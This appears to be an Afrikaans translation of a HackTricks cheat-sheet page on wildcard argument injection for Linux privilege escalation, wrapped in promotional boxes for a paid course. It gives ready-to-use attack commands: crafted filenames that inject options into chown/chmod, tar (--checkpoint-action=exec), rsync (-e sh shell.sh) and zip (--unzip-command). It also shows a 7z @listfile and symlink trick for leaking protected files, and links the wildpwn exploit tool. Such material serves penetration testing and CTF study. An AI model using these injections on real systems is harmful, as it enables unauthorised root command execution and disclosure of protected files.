<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>


## chown, chmod

Jy kan **aandui watter lêiereienaar en toestemmings jy wil kopieer vir die res van die lêers**
```bash
touch "--reference=/my/own/path/filename"
```
Jy kan dit uitbuit deur gebruik te maak van [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(gekombineerde aanval)_\
Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Voer willekeurige opdragte uit:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Jy kan dit uitbuit deur gebruik te maak van [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar aanval)_\
Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Voer willekeurige opdragte uit:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Jy kan dit uitbuit deur gebruik te maak van [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(rsync-aanval)_\
Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** kan jy selfs deur `--` voor `*` te gebruik (let daarop dat `--` beteken dat die volgende inset nie as parameters behandel kan word nie, so net lêernaamspaaie in hierdie geval) 'n willekeurige fout veroorsaak om 'n lêer te lees, so as 'n opdrag soos die volgende deur root uitgevoer word:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
En jy kan lêers in die gids waar dit uitgevoer word, skep. Jy kan die lêer `@root.txt` en die lêer `root.txt` skep as 'n **symlink** na die lêer wat jy wil lees:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dan, wanneer **7z** uitgevoer word, sal dit `root.txt` behandel as 'n lêer wat die lys van lêers bevat wat dit moet komprimeer (dit is wat die bestaan van `@root.txt` aandui) en wanneer 7z `root.txt` lees, sal dit `/file/you/want/to/read` lees en **aangesien die inhoud van hierdie lêer nie 'n lys van lêers is nie, sal dit 'n fout veroorsaak** wat die inhoud wys.

_Meer inligting in Write-ups van die boks CTF van HackTheBox._

## Zip

**Voer willekeurige opdragte uit:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
